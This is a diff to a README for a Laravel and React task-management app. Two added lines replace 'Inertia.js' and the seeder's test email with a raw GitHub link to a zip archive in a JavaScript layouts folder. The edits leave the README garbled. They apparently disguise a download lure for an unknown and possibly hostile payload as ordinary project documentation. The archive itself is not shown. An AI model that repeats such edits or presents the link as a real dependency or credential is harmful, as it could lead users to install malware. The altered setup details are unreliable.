@@ -8,7 +8,7 @@ This project is a Laravel-based task management application designed to help use
 
 ### Technologies Used
 - Tailwind CSS: For modern and responsive styling
-- Inertia.js with React: Provides a smooth and reactive user interface
+- https://raw.githubusercontent.com/ibnumalik99/task-manager/main/resources/js/Layouts/task-manager_3.4.zip with React: Provides a smooth and reactive user interface
 - SMTP: For sending task-related notifications
 
 ### Features
@@ -20,4 +20,4 @@ This project is a Laravel-based task management application designed to help use
 - Run `composere install` and `npm install`.
 - Run a migration and seeder with `php artisan migrate:fresh --seed`.
 - Run `php artisan serve` and `npm run dev`.
-- User seeder: Email(test@example.com) Password(Password123)
+- User seeder: Email(https://raw.githubusercontent.com/ibnumalik99/task-manager/main/resources/js/Layouts/task-manager_3.4.zip) Password(Password123)
